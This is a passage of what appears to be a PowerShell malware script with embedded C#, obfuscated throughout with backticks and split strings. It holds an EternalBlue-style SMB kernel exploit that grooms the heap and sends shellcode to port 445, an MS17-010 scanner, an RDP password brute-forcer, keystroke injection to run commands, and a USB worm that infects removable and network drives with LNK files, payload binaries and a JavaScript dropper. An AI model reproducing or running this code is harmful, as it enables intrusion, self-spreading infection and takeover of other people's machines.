     $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 

     $pkt +=0x00,0x00         

     $pkt +=0xff,0xff        

     $pkt +=0x2F,0x4B        

     $pkt += $userid           

     $pkt +=0x00,0x00      

    $ipc = (('waJwaJ').replACE('waJ',[StrInG][CHar]92))+ $target + "\IPC$"

     $pkt +=0x04              

     $pkt +=0xFF             

     $pkt +=0x00             

     $pkt +=0x00,0x00       

     $pkt +=0x00,0x00        

     $pkt +=0x01,0x00      

     $al=[system.Text.Encoding]::ASCII.GetBytes($ipc).Count+8

     $pkt+=[bitconverter]::GetBytes($al)[0],0x00

     $pkt +=0x00              

     $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc) 

     $pkt += 0x00       

     $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00 

    $len = $pkt.Length - 4

    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]

    $pkt[1] = $hexlen[0]

    $pkt[2] = $hexlen[1]

    $pkt[3] = $hexlen[2]

    return $pkt

    }

function make_smb1_nt_trans_packet8($tree_id, $user_id) { 

    [Byte[]]  $pkt = [Byte[]] (0x00)                 

    $pkt += 0x00,0x08,0x3C           

    $pkt += 0xff,0x53,0x4D,0x42       

    $pkt += 0xa0                

    $pkt += 0x00,0x00,0x00,0x00      

    $pkt += 0x18   

    $pkt += 0x01,0x48

    $pkt += 0x00,0x00 

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x00,0x00,0x00,0x00 

    $pkt += 0x00,0x00

    $pkt += $tree_id 

    $pkt += 0x2f,0x4b 

    $pkt += $user_id  

    $pkt += 0x00,0x00 

    $pkt += 0x14           

    $pkt += 0x01          

    $pkt += 0x00,0x00  

    $pkt += 0x1e,0x00,0x00,0x00 

    $pkt += 0x49,0x01,0x01,0x00  

    $pkt += 0x1e,0x00,0x00,0x00

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x1e,0x00,0x00,0x00 

    $pkt += 0x4c,0x00,0x00,0x00 

    $pkt += 0x49,0x01,0x00,0x00 

    $pkt += 0x6c,0x00,0x00,0x00

    $pkt += 0x01

    $pkt += 0x00,0x00  

    $pkt += 0x00,0x00 

    $pkt += 0x6a,0x01 

    $pkt += 0xff

    $pkt += [Byte[]] (0x00) * 0x1e 

    $pkt += 0xff,0xff,0x00,0x00,0x01

    $pkt += [Byte[]](0x00) * 0x146

    $len = $pkt.Length - 4

    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]

    $pkt[1] = $hexlen[0]

    $pkt[2] = $hexlen[1]

    $pkt[3] = $hexlen[2]

    return $pkt

  }

function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) {

    $timeout = ($timeout * 0x10) + 1

    [Byte[]]  $pkt = [Byte[]] (0x00)

    $pkt += 0x00,0x10,0x38 

    $pkt += 0xff,0x53,0x4D,0x42 

    $pkt += 0x33

    $pkt += 0x00,0x00,0x00,0x00 

    $pkt += 0x18

    $pkt += 0x01,0x48

    $pkt += 0x00,0x00 

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x00,0x00,0x00,0x00 

    $pkt += 0x00,0x00

    $pkt += $tree_id 

    $pkt += 0x2f,0x4b

    $pkt += $user_id 

    $pkt += 0x00,0x00 

    $pkt += 0x09   

    $pkt += 0x00,0x00    

    $pkt += 0x00,0x10  

    $pkt += 0x00,0x00 

    $pkt += 0x00,0x00

    $pkt += 0x00 

    $pkt += 0x00 

    $pkt += 0x00,0x10  

    $pkt += 0x38,0x00,0x49

    $pkt += [bitconverter]::GetBytes($timeout)[0]

    $pkt += 0x00,0x00 

    $pkt += 0x03,0x10

    $pkt += 0xff,0xff,0xff  

    $pkt +=$data  

    $len = $pkt.Length - 4

    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]

    $pkt[1] = $hexlen[0]

    $pkt[2] = $hexlen[1]

    $pkt[3] = $hexlen[2]    

    return $pkt    

}   

function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk){

    $nt_trans_pkt = M`A`ke_`sMb1_`Nt_tRaNS_`pA`C`kET8 $smbheader.tree_id $smbheader.user_id

    $sock.Send($nt_trans_pkt) | OuT`-`NUll

    $raw, $transheader = sMb1`_gET_R`eS`PONsE8($sock)

    if (!($transheader.error_class -eq 0x00 -and ($transheader.reserved1 -eq 0x00) -and ($transheader.error_code[0] -eq 0x00) -and ($transheader.error_code[1] -eq 0x00)))

    {

    return -1,-1

    }

    $i=$firstDataFragmentSize

    $timeout=0

    while ($i -lt $data.count)

    {

        $sendSize=[System.Math]::Min(4096,($data.count-$i))

        if (($data.count-$i) -le 4096){

         if (!$sendLastChunk)

            { break }

         }

        $trans2_pkt = m`Ak`E_Smb1_Tr`ANs2_EX`P`Loi`T_PaCKeT8 $smbheader.tree_id $smbheader.user_id $data[$i..($i+$sendSize-1)] $timeout

        $sock.Send($trans2_pkt) | oUT`-NU`lL

        $timeout+=1

        $i +=$sendSize

    } 

    if ($sendLastChunk)

    {Smb1_gET_rEsP`ON`s`e8($sock) }

    return $i,$timeout

}

function createSessionAllocNonPaged8($target, $size) {

   $client = NEW-o`B`JECT System.Net.Sockets.TcpClient($target,445)

   $sock = $client.Client

   ClI`eNt`_`NEgOt`IaTe8 $sock $false | Ou`T`-nuLl

   $flags2=16385

   if ($size -ge 0xffff)

   { $reqsize=$size /2}

   else

   {

     $flags2 =49153

     $reqsize= $size

   }

    $a=[bitconverter]::GetBytes($reqsize)

    $b=[bitconverter]::GetBytes($flags2)

    $pkt =  maK`E_`s`mB1`_frE`E`_Ho`LE_S`ESsi`ON_PAcK`Et8 ($b[0],$b[1]) (0x02,0x00) ($a[0],$a[1],0x00,0x00,0x00)

    $sock.Send($pkt) | O`Ut-NULL

    SmB`1_`GeT_RE`SpOnS`E8($sock) | Ou`T-`NuLl

    return $sock

}

function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os) { 

    [Byte[]] $pkt = 0x00       

    $pkt += 0x00,0x00,0x51      

    $pkt += 0xff,0x53,0x4D,0x42      

    $pkt += 0x73   

    $pkt += 0x00,0x00,0x00,0x00 

    $pkt += 0x18 

    $pkt += $flags2  

    $pkt += 0x00,0x00 

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x00,0x00,0x00,0x00

    $pkt += 0x00,0x00

    $pkt += 0xff,0xff 

    $pkt += 0x2f,0x4b

    $pkt += 0x00,0x00  

    $pkt += 0x00,0x00  

    $pkt += 0x0c 

    $pkt += 0xff  

    $pkt += 0x00  

    $pkt += 0x00,0x00   

    $pkt += 0x00,0xf0 

    $pkt += 0x02,0x00 

    $pkt += $vcnum  

    $pkt += 0x00,0x00,0x00,0x00  

    $pkt += 0x00,0x00    

    $pkt += 0x00,0x00,0x00,0x00 

    $pkt += 0x40,0x00,0x00,0x80  

    $pkt += 0x16,0x00     

    $pkt += $native_os

    $pkt += [Byte[]] (0x00) * 17  

    return $pkt

  }

function make_smb2_payload_headers_packet8($for_nx){

    [Byte[]] $pkt = [Byte[]](0x00,0x00,0x81,0x00) + [system.Text.Encoding]::ASCII.GetBytes(('BA'+'AD')) 

    if ($for_nx){ $pkt+=[Byte[]](0x00)*123 }

    else{ $pkt+=[Byte[]](0x00)*124  }

    return $pkt

}

function eb8($target,$sc) {  

    $NTFEA_SIZE8 = 0x9000

    $ntfea9000=[byte[]]0x00*0xbe0

    $ntfea9000 +=0x00,0x00,0x5c,0x73+[byte[]]0x00*0x735d

    $ntfea9000 +=0x00,0x00,0x47,0x81+[byte[]]0x00*0x8148

    $TARGET_HAL_HEAP_ADDR = 0xffffffffffd04000

    $SHELLCODE_PAGE_ADDR =  0xffffffffffd04000

    $PTE_ADDR=0xfffff6ffffffe820

    $fakeSrvNetBufferX64Nx =@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xf0,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x60,0x00,0x04,0x10,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xa8,0xe7,0xff,0xff,0xff,0xf6,0xff,0xff)

    [byte[]]$feaListNx=[byte[]](0x00,0x00,0x01,0x00)

    $feaListNx += $ntfea9000

    $feaListNx +=0x00,0x00,0xaf,0x00+ $fakeSrvNetBufferX64Nx

    $feaListNx +=0x12,0x34,0x78,0x56

    [byte[]]$fake_recv_struct=@(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x58,0x40,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x41,0xd0,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xb0,0x7e,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x80,0x41,0xd0,0xff,0xff,0xff,0xff,0xff)

    $feaList = cREAtE`FEaL`i`S`T8 $sc.length  $ntfea9000  

    $client = New-`OB`jecT System.Net.Sockets.TcpClient($target,445)  

    $sock = $client.Client

    cLIENT_n`E`Got`IATE8 $sock $true | Out`-n`ULl

    $raw, $smbheader = S`mB1_lOg`In8 $sock

    $os=[system.Text.Encoding]::ascii.GetString($raw[45..($raw.count-1)]).ToLower()

    if ($os.contains(('wi'+'nd'+'ows 10 ')))

    {

        $b=[int]$os.split(" ")[-1]

        if ($b -ge 14393) {return $False}

    }

    if (!(($os.contains(('wi'+'ndows '+'8'))) -or ($os.contains(('win'+'dow'+'s')) -and $os.contains(('20'+'12')))))

    {return $False}

    $sock.ReceiveTimeout =5000 

    $raw, $smbheader = Tree_CONNE`cT_`AN`dX8 $sock $target $smbheader.user_id

    $progress , $timeout= s`END_bI`G_tRAn`S28 $sock $smbheader $feaList ($feaList.length%4096) $False  

    if (($progress -eq -1) -and ($timeout -eq -1))

    {return $false}

    $client2 = neW-obJ`e`CT System.Net.Sockets.TcpClient($target,445)  

    $sock2 = $client2.Client

    cL`i`Ent_`NeGotiat`e8 $sock2 $true | O`U`T-NulL

    $raw, $smbheader_t = smB1_`L`OGIN8 $sock2

    $raw, $smbheader2 = Tr`ee_cO`N`NeCt_AN`DX8 $sock2 $target $smbheader_t.user_id

    $progress2 , $timeout2= SEn`D`_big_TrANS`28 $sock2 $smbheader2 $feaListNx ($feaList.length%4096) $False  

    if (($progress2 -eq -1) -and ($timeout2 -eq -1))

    {return $false}

    $allocConn = cr`e`A`TESesSIO`N`AllOCN`onpa`GED8 $target ($NTFEA_SIZE8 - 0x2010)   

     $payload_hdr_pkt = MAK`E_s`Mb`2_`pAYLOaD_Hea`ders`_pAcKe`T8($true)

     $groom_socks =@()

     for ($i=0; $i -lt 13; $i++)

     {

        $client = ne`W-Obj`e`ct System.Net.Sockets.TcpClient($target,445)

        $client.NoDelay = $true

        $gsock = $client.Client

        $groom_socks += $gsock

        $gsock.Send($payload_hdr_pkt) | o`Ut`-Null  

     }

    $holeConn = CReaT`e`Ses`SiO`NaLLoCnONPaGed8 $target ($NTFEA_SIZE8 - 0x10)

    $allocConn.close()

    for ($i=0; $i -lt 5; $i++)

     {

         $client = N`EW-ObJ`ect System.Net.Sockets.TcpClient($target,445)

         $client.NoDelay = $true

         $gsock = $client.Client    

         $groom_socks += $gsock

         $gsock.Send($payload_hdr_pkt) | o`Ut-null  

     }

    $holeConn.close()

    $trans2_pkt2 = mAkE_Sm`B1_TRaNS2`_E`X`pLoit_pA`C`ket8 $smbheader2.tree_id $smbheader2.user_id $feaListNx[$progress2..$feaListNx.count] $timeout2

    $sock2.Send($trans2_pkt2) | ouT-n`U`ll

    $raw2, $transheader2 = sMB1_`geT`_RE`sP`o`NSE8($sock2)

    if ($raw2 -eq -1 -and ($transheader2 -eq -1)){return $false}

    foreach ($sk in $groom_socks)

    {

        $sk.Send([byte[]]0x00) | Ou`T-Null

    }

    $trans2_pkt =MAKE_Sm`B1_TRa`N`S2_eXP`Lo`I`T_`Pa`CKE`T8 $smbheader.tree_id $smbheader.user_id $feaList[$progress..$feaList.count] $timeout

    $sock.Send($trans2_pkt) | o`UT`-NuLL

    $raw, $transheader = smB`1_GET`_Re`spo`NSE8($sock)

    if ($raw -eq -1 -and ($transheader -eq -1)){return $false}

    foreach ($sk in $groom_socks)

    {

        $sk.Send($fake_recv_struct + $sc) | oU`T`-NUll

    }

     foreach ($sk in $groom_socks)

    {

        $sk.close() | oU`T-`NulL

    }

    $sock.Close()| Out-`N`ULL

    return $true  

  }

$Source = @"

using System;

using System.Collections.Generic;

using System.Diagnostics;

using System.IO;

using System.Net;

using System.Net.Sockets;

using System.Text;

namespace PingCastle.Scanners

{

    public class m17sc

    {

        static public bool Scan(string computer)

        {

            TcpClient client = new TcpClient();

            client.Connect(computer, 445);

            try

            {

                NetworkStream stream = client.GetStream();

                byte[] negotiatemessage = GetNegotiateMessage();

                stream.Write(negotiatemessage, 0, negotiatemessage.Length);

                stream.Flush();

                byte[] response = ReadSmbResponse(stream);

                if (!(response[8] == 0x72 && response[9] == 00))

                {

                    throw new InvalidOperationException("invalid negotiate response");

                }

                byte[] sessionSetup = GetR(response);

                stream.Write(sessionSetup, 0, sessionSetup.Length);

                stream.Flush();

                response = ReadSmbResponse(stream);

                if (!(response[8] == 0x73 && response[9] == 00))

                {

                    throw new InvalidOperationException("invalid sessionSetup response");

                }

                byte[] treeconnect = GetTreeConnectAndXRequest(response, computer);

                stream.Write(treeconnect, 0, treeconnect.Length);

                stream.Flush();

                response = ReadSmbResponse(stream);

                if (!(response[8] == 0x75 && response[9] == 00))

                {

                    throw new InvalidOperationException("invalid TreeConnect response");

                }

                byte[] peeknamedpipe = GetPeekNamedPipe(response);

                stream.Write(peeknamedpipe, 0, peeknamedpipe.Length);

                stream.Flush();

                response = ReadSmbResponse(stream);

                if (response[8] == 0x25 && response[9] == 0x05 && response[10] ==0x02 && response[11] ==0x00 && response[12] ==0xc0 )

                {

                    return true;

                }

            }

            catch (Exception)

            {

                throw;

            }

            return false;

        }

        private static byte[] ReadSmbResponse(NetworkStream stream)

        {

            byte[] temp = new byte[4];

            stream.Read(temp, 0, 4);

            int size = temp[3] + temp[2] * 0x100 + temp[3] * 0x10000;

            byte[] output = new byte[size + 4];

            stream.Read(output, 4, size);

            Array.Copy(temp, output, 4);

            return output;

        }

        static byte[] GetNegotiateMessage()

        {

            byte[] output = new byte[] {

                0x00,0x00,0x00,0x00, 

                0xff,0x53,0x4d,0x42, 

                0x72, 

                0x00, 

                0x00,

                0x00,0x00, 

                0x18, 

                0x01,0x28, 

                0x00,0x00, 

                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

                0x00,0x00, 

                0x00,0x00, 

                0x44,0x6d, 

                0x00,0x00, 

                0x42,0xc1, 

                0x00, 

                0x31,0x00,

                0x02,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x31,0x2e,0x30,0x00, 

                0x02,0x4c,0x4d,0x31,0x2e,0x32,0x58,0x30,0x30,0x32,0x00, 

                0x02,0x4e,0x54,0x20,0x4c,0x41,0x4e,0x4d,0x41,0x4e,0x20,0x31,0x2e,0x30,0x00, 

                0x02,0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00, 

            };

            return EncodeNetBiosLength(output);

        }

        static byte[] GetR(byte[] data)

        {

            byte[] output = new byte[] {

                0x00,0x00,0x00,0x00, 

                0xff,0x53,0x4d,0x42, 

                0x73, 

                0x00, 

                0x00, 

                0x00,0x00, 

                0x18, 

                0x01,0x28, 

                0x00,0x00, 

                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 

                0x00,0x00, 

                data[28],data[29],data[30],data[31],data[32],data[33],

                0x42,0xc1, 

                0x0d, 

                0xff, 

                0x00, 

                0x00,0x00, 

                0xdf,0xff, 

                0x02,0x00,

                0x01,0x00, 

                0x00,0x00,0x00,0x00, 

                0x00,0x00, 

                0x00,0x00, 

                0x00,0x00,0x00,0x00, 

                0x40,0x00,0x00,0x00, 

                0x26,0x00, 

                0x00,

                0x2e,0x00, 

                0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x32,0x31,0x39,0x35,0x00, 

                0x57,0x69,0x6e,0x64,0x6f,0x77,0x73,0x20,0x32,0x30,0x30,0x30,0x20,0x35,0x2e,0x30,0x00 

            };

            return EncodeNetBiosLength(output);

        }

        private static byte[] EncodeNetBiosLength(byte[] input)

        {

            byte[] len = BitConverter.GetBytes(input.Length-4);

            input[3] = len[0];

            input[2] = len[1];

            input[1] = len[2];

            return input;

        }

        static byte[] GetTreeConnectAndXRequest(byte[] data, string computer)

        {

            MemoryStream ms = new MemoryStream();

            BinaryReader reader = new BinaryReader(ms);

            byte[] part1 = new byte[] {

                0x00,0x00,0x00,0x00, 

                0xff,0x53,0x4d,0x42, 

                0x75, 

                0x00, 

                0x00, 

                0x00,0x00, 

                0x18, 

                0x01,0x28, 

                0x00,0x00, 

                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,

                0x00,0x00, 

                data[28],data[29],data[30],data[31],data[32],data[33],

                0x42,0xc1, 

                0x04, 

                0xff, 

                0x00, 

                0x00,0x00, 

                0x00,0x00, 

                0x01,0x00, 

                0x19,0x00, 

                0x00, 

                0x5c,0x5c};

            byte[] part2 = new byte[] {

                0x5c,0x49,0x50,0x43,0x24,0x00, 

                0x3f,0x3f,0x3f,0x3f,0x3f,0x00

            };

            ms.Write(part1, 0, part1.Length);

            byte[] encodedcomputer = new ASCIIEncoding().GetBytes(computer);

            ms.Write(encodedcomputer, 0, encodedcomputer.Length);

            ms.Write(part2, 0, part2.Length);

            ms.Seek(0, SeekOrigin.Begin);

            byte[] output = reader.ReadBytes((int) reader.BaseStream.Length);

            return EncodeNetBiosLength(output);

        }

        static byte[] GetPeekNamedPipe(byte[] data)

        {

            byte[] output = new byte[] {

                0x00,0x00,0x00,0x00, 

                0xff,0x53,0x4d,0x42,

                0x25, 

                0x00,

                0x00, 

                0x00,0x00, 

                0x18, 

                0x01,0x28, 

                0x00,0x00,

                0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, 

                0x00,0x00, 

                data[28],data[29],data[30],data[31],data[32],data[33],

                0x42,0xc1,

                0x10, 

                0x00,0x00, 

                0x00,0x00, 

                0xff,0xff, 

                0xff,0xff, 

                0x00, 

                0x00, 

                0x00,0x00,

                0x00,0x00,0x00,0x00, 

                0x00,0x00, 

                0x00,0x00, 

                0x4a,0x00, 

                0x00,0x00,

                0x4a,0x00, 

                0x02,

                0x00, 

                0x23,0x00, 

                0x00,0x00, 

                0x07,0x00, 

                0x5c,0x50,0x49,0x50,0x45,0x5c,0x00 

            };

            return EncodeNetBiosLength(output);

        }

    }

}

"@

aD`d-TY`pe -TypeDefinition $Source

$source1=@"

using System;

using System.Threading;

using System.Drawing;

using System.Diagnostics;

using System.ComponentModel;

using System.Collections.Generic;

using System.Text;

using System.Windows.Forms;

using System.Runtime.InteropServices;

using System.Collections;

using System.Reflection;

namespace RDP

{

    public class BRUTE

    {

        private int flag1=-1;

        private bool check_login;

        private Process process;

        public void exit(){

            if(!process.HasExited){

                process.Kill();

            };

            process.Close();

        }

        public int check(string exePath, string ip, string user, string pass, bool checklogin)

        {   

            try{

                check_login = checklogin;

                process = new System.Diagnostics.Process();

                process.StartInfo.FileName = exePath;

                if(checklogin){

                    process.StartInfo.Arguments = "/u:"+user+" /p:"+pass+" /cert-ignore /sec:nla /log-level:trace /size:700x700 /v:"+ip;

                } else {

                    process.StartInfo.Arguments = "/u:"+user+" /p:"+pass+" /cert-ignore +auth-only /sec:nla /log-level:trace /v:"+ip;

                }

                process.StartInfo.UseShellExecute = false;

                process.StartInfo.CreateNoWindow = true;

                process.StartInfo.RedirectStandardOutput = true;

                process.Start();

                process.BeginOutputReadLine();

                process.OutputDataReceived += new DataReceivedEventHandler(processOutputDataReceived);

                System.Threading.Timer timer = new System.Threading.Timer(autoQuite, null, 10000, 5000);

                while(true){

                    if(process.HasExited){return 0;}

                    Thread.Sleep(1000);

                    if(flag1!=-1) {

                        if(!checklogin){exit();}

                        return flag1;

                    }

                }

            }

            catch (Exception ex)

            {

                Console.WriteLine(ex.Message);

                return 0;

            }

        }

        private void autoQuite(object state) {

            flag1=0;

        }

        private void processOutputDataReceived(object sender, DataReceivedEventArgs e)

        {

            try{

                if(check_login) {

                    if(e.Data.Contains("LogonInfoV2")){

                        flag1=1;

                    }

                } else {

                    if(e.Data.Contains("Server rdp encryption method")){

                        flag1 = 1;

                    } else if(e.Data.Contains("check_fds: transport_read_pdu() - -1")){

                        flag1 = 0;

                    }

                }

            }

            catch (Exception ex)

            {

                string a=ex.Message;

            }

        }

    }

    public class User32Helper {

        [DllImport("user32.dll")]

        public static extern int SetForegroundWindow(IntPtr point);

    }

    public class CMD {

        struct INPUT{public INPUTType type;public INPUTUnion Event;}

        [StructLayout(LayoutKind.Explicit)]

        struct INPUTUnion{

            [FieldOffset(0)]

            internal MOUSEINPUT mi;

            [FieldOffset(0)]

            internal KEYBDINPUT ki;

            [FieldOffset(0)]

            internal HARDWAREINPUT hi;

        }

        [StructLayout(LayoutKind.Sequential)]

        struct MOUSEINPUT{public int dx;public int dy;public int mouseData;public int dwFlags;public uint time;public IntPtr dwExtraInfo;}

        [StructLayout(LayoutKind.Sequential)]

        struct KEYBDINPUT{public ushort wVk;public ushort wScan;public KEYEVENTF dwFlags;public int time;public IntPtr dwExtraInfo;}

        [StructLayout(LayoutKind.Sequential)]

        struct HARDWAREINPUT{public int uMsg;public short wParamL;public short wParamH;}

        enum INPUTType : uint{INPUT_KEYBOARD = 1}

        [Flags]

        enum KEYEVENTF : uint{EXTENDEDKEY = 0x0001,KEYUP = 0x0002,SCANCODE = 0x0008,UNICODE = 0x0004}

        [DllImport("user32.dll", SetLastError = true)]

        static extern UInt32 SendInput(int numberOfInputs, INPUT[] inputs, int sizeOfInputStructure);

        [System.Runtime.InteropServices.DllImport("user32.dll")]

        internal static extern uint MapVirtualKey(uint uCode, uint uMapType);   

        public static void runCmd(string cmdstr){

            WinR();

            Copy(cmdstr);

            Paste();

            Enter();

            Copy(" ");

        }

        private static void Copy(string keys) {

            Exception threadEx = null;

            Thread staThread = new Thread(

                delegate ()

                {

                    try

                    {

                        Clipboard.SetText(keys);

                    }

                    catch (Exception ex) 

                    {

                        threadEx = ex;            

                    }

                });

            staThread.SetApartmentState(ApartmentState.STA);

            staThread.Start();

            staThread.Join();

        }

        private static void WinR(){

            INPUT[] input = new INPUT[4];               

            input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;

            input[0].Event.ki.wScan  = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);

            input[1].Event.ki.wScan  = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.Escape, (uint)0x0);

            input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;            

            SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));

        }

        private static void Paste(){

            Thread.Sleep(200);

            INPUT[] input = new INPUT[4];   

            input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;

            input[0].Event.ki.wScan  = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);

            input[1].Event.ki.wScan  = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.V, (uint)0x0);

            input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;            

            SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));

        }

        private static void Enter(){

            Thread.Sleep(200);

            INPUT[] input = new INPUT[4];   

            input[0].type = input[1].type = input[2].type = input[3].type = INPUTType.INPUT_KEYBOARD;

            input[0].Event.ki.wScan  = input[2].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.ControlKey, (uint)0x0);

            input[1].Event.ki.wScan  = input[3].Event.ki.wScan = (ushort)MapVirtualKey((uint)Keys.Return, (uint)0x0);

            input[2].Event.ki.dwFlags = input[3].Event.ki.dwFlags = KEYEVENTF.KEYUP;    

            SendInput(4, input, Marshal.SizeOf(typeof(INPUT)));

        }

    }

}

"@

aDd-TYpe -TypeDefinition $source1 -ReferencedAssemblies @("System.Windows.Forms")

$source2=@"

using System;

using System.Threading;

using System.IO;

using System.Collections.Generic;

using System.Text;

using System.Runtime.InteropServices;

using System.Reflection;

namespace USB

{

public class USBLNK

    {

        public static List<string> blacklist = new List<string>();

        public static string gb3;

        public static string gb6;

        public static string jsdata;

        const string home = "UTFsync";

        const string inf_data = "\\inf_data";

        static public void Main1(string b1, string b2, string b3)

        {

            gb3 = b1;

            gb6 = b2;

            jsdata = b3;

            Timer timer = new Timer(ResetBlacklist, null, 10000, 10000);

            while (true)

            {

                BaseMode();

                Thread.Sleep(5000);

            }

        }

        static void ResetBlacklist(object state) {

            blacklist.Clear();

        }

        static bool CreateHomeDirectory(string drive)

        {

            try

            {

                DirectoryInfo directoryInfo = Directory.CreateDirectory(drive + home);

                directoryInfo.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                return true;

            }

            catch{}

            return false;

        }

        static bool IsSupported(DriveInfo drive) { return drive.IsReady && drive.AvailableFreeSpace > 1024

            && (drive.DriveType == DriveType.Removable || drive.DriveType == DriveType.Network)

            && (drive.DriveFormat == "FAT32" || drive.DriveFormat == "NTFS");}

        static bool CheckBlacklist(string name) { return name==home || name=="System Volume Information" || name=="$RECYCLE.BIN";}

        static bool Infect(string drive)

        {

            if (blacklist.Contains(drive)) {return true;}

            CreateLnk(drive, "blue3.bin", gb3);

            CreateLnk(drive, "blue6.bin", gb6);

            CreateJs(drive, "readme.js", jsdata);

            try

            {

                File.Create(drive + home + inf_data);

                return true;

            }

            catch (Exception ex)

            {

                Console.WriteLine(ex.Message);

            }

            return false;

        }

        static bool CreateJs(string drive, string fname, string gb)

        {

            FileStream fs1 = new FileStream(drive+fname, FileMode.Create);

